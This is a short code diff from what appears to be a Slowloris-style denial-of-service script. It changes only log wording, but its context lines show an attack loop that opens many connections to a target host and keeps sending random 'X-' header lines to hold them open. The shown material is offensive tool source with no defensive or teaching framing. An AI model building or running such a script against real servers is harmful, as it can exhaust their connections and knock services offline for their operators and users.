@@ -119,7 +119,7 @@ def init_attack(nAttackers):
     return attacker(identifier, agent, s)
 
 def main():
-    logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections))
+    logging.info("\033[38;5;220mCreating attacker \033[36m{} \033[37mConnections: \033[33m{}\033[0m".format(host, connections))
     logging.info("Establishing connections..")
     attackers = []
 
@@ -131,7 +131,7 @@ def main():
 
     while True:
         try:
-            logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections))
+            logging.info("\033[38;5;220mCreating attacker \033[36m{} \033[37mConnections: \033[33m{}\033[0m".format(host, connections))
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
